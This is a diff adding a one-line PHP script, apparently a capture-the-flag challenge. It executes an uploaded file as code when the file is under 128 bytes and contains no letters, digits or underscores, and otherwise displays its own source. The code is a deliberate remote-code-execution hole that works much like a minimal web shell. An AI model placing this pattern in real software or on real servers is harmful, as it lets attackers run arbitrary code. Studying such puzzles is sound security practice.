@@ -1,0 +1,1 @@
+<?=!$I=&$_FILES[!!$l='tmp_name']||$I['size']>>7||preg_match('/\w/',join(file($I[$l])))?!show_source(__FILE__):!include($I[$l]);
